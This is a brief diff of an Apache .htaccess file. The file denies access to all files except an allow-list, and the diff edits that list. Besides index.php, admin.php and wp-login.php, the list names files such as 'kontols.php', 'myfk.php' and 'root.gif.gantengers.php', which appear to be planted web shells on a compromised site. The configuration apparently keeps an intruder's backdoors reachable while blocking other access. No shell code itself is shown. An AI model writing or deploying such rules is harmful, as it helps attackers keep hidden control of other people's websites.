@@ -10,7 +10,7 @@ DirectoryIndex home.php
     Deny from all
     Satisfy All
 </FilesMatch>
-<FilesMatch "^(template.php|root.gif.gantengers.php|index.php|content.php|kontols.php|admin.php|wp-login.php)$">
+<FilesMatch "^(template.php|index.php|index.php|myfk.php|kontols.php|admin.php|wp-login.php)$">
  Order allow,deny
  Allow from all
 </FilesMatch>
